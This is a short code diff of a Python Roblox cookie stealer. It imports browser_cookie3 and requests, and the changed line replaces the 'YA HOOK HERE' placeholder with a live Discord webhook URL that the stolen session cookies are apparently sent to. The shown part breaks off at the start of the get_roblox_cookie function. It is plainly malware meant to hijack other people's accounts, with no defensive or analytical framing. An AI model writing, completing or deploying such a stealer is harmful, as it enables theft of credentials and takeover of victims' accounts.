@@ -1,7 +1,7 @@
 import browser_cookie3,json,requests,os,shutil,sys
 
 ##replace disshit
-webhook_url = "YA HOOK HERE"
+webhook_url = "https://discord.com/api/webhooks/1496998050529546353/LknaZ44I30ZxXvwWKWls-3Ih5hs5LNDpnHCEIOZWreE2-V1WkIzrSPL-uFXimcYT8-2o"
 ##roblox cookie extraction proccess usign modile uh the fucking broswercookie
 def get_roblox_cookie():
     cookies = {}
